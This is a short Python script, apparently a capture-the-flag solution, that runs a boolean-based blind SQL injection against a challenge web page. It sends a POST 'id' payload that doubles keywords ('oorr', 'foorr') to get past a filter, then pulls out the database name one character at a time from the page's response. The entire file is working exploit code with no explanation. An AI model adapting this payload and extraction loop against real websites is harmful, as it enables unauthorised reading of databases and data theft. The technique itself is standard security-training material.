#!/usr/bin/python
import requests
str = "You are in"
url = "http://ctf5.shiyanbar.com/web/earnest/index.php"
guess = "abcdefghijklmnopqrstuvwxyz0123456789~+=-*/\{}?!:@#$&[]._"
database = ''
print("start")
for i in range(1,19):
    for j in guess:
        key = {'id':"0'oorr((mid((database())from(%s)foorr(1)))='%s')oorr'0" %(i,j)}
        res = requests.post(url,data=key).text
        print('............%s......%s.......'%(i,j))
        if str in res:
            database += j
            break
print(database)
print("end!")
